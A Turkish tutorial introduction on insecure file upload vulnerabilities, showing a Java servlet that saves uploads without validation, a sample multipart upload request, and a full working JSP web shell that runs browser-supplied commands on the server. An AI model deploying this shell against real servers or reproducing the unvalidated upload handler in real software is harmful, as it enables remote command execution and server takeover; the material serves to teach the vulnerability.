# Giriş

Güvensiz dosya yükleme saldırıları, sunucuya zararlı dosyaların kullanıcı tarafından yüklenebilmesi ve daha sonra **sunucu üzerinde çalıştırılması** ile yapılan saldırılardır.

Aşağıda güvensiz dosya yükleme yapılan örnek bir uygulamadaki ilgili kod bloğu verilmiştir.

| <p><strong>Protected void doPost(HttpServletRequest …){</strong></p><p>            <strong>Part filePart = request.getPart("file");</strong></p><p>            <strong>String fileName = UploadedPath + getFileName(filePart);</strong></p><p>            <strong>InputStream fileContent = filePart.getInputStream();</strong></p><p>            <strong>OutputStream out = new FileOutputStream(fileName);</strong></p><p> <strong></strong> </p><p>            <strong>int read = 0;</strong></p><p>            <strong>byte[] bytes = new byte[1024];</strong></p><p>            <strong>while ((read = fileContent.read(bytes)) != -1)</strong></p><p>                        <strong>out.write(bytes, 0, read)</strong></p> |
| --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |

**Örnek dosya yükleme HTTP isteği;**

| <p><strong>POST /UploadDownload/UploadServlet HTTP/1.1</strong></p><p><strong>Host: localhost:8084</strong></p><p><strong>User-Agent: Mozilla/5.0 (Windows NT 6.1;) Firefox/18.0</strong></p><p><strong>Accept-Encoding: gzip, deflate</strong></p><p><strong>Content-Type: multipart/form-data; boundary=-14924204829836</strong></p><p><strong>Content-Length: 6172</strong></p><p><strong>--------------------------------14924204829836</strong></p><p><strong>Content-Disposition: form-data; name=”file”; filename=”sleepy.jpg”</strong></p><p><strong>Content-Type: image/jpeg</strong></p> |
| -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |

Yukarıdaki istekte geçerli bir dosya yükleme işleminde resim dosyası yüklenmiştir. Saldırgan bu resim dosyasının içeriğine Java uygulamalarda çalışabilecek JSP Shell ekleyerek, sunucu üzerinde uygulamanın çalıştığı kullanıcının yetkisi ile komutlar çalıştırabilir, sunucuda yetkileri dışında işlemler yapabilir. Bu sayede saldırgan sunucu üzerindeki shell ortamını kendi tarayıcısı üzerinden kontrol edebilir.

| <p><strong>&#x3C;%@ page import="java.util.*,java.io.*"%></strong></p><p><strong>&#x3C;%</strong></p><p><strong>%></strong></p><p><strong>&#x3C;HTML>&#x3C;BODY></strong></p><p><strong>Commands with JSP</strong></p><p><strong>&#x3C;FORM METHOD="GET" NAME="myform" ACTION=""></strong></p><p><strong>&#x3C;INPUT TYPE="text" NAME="cmd"></strong></p><p><strong>&#x3C;INPUT TYPE="submit" VALUE="Send"></strong></p><p><strong>&#x3C;/FORM></strong></p><p><strong>&#x3C;pre></strong></p><p><strong>&#x3C;%</strong></p><p><strong>if (request.getParameter("cmd") != null) {</strong></p><p>    <strong>out.println("Command: " + request.getParameter("cmd") + "&#x3C;BR>");</strong></p><p>    <strong>Process p;</strong></p><p>    <strong>if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1){</strong></p><p>        <strong>p = Runtime.getRuntime().exec("cmd.exe /C " + request.getParameter("cmd"));</strong></p><p>    <strong>}</strong></p><p>    <strong>else{</strong></p><p>        <strong>p = Runtime.getRuntime().exec(request.getParameter("cmd"));</strong></p><p>    <strong>}</strong></p><p>    <strong>OutputStream os = p.getOutputStream();</strong></p><p>    <strong>InputStream in = p.getInputStream();</strong></p><p>    <strong>DataInputStream dis = new DataInputStream(in);</strong></p><p>    <strong>String disr = dis.readLine();</strong></p><p>    <strong>while ( disr != null ) {</strong></p><p>    <strong>out.println(disr);</strong></p><p>    <strong>disr = dis.readLine();</strong></p><p>    <strong>}</strong></p><p><strong>}</strong></p><p><strong>%></strong></p><p><strong>&#x3C;/pre></strong></p><p><strong>&#x3C;/BODY>&#x3C;/HTML></strong></p> |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
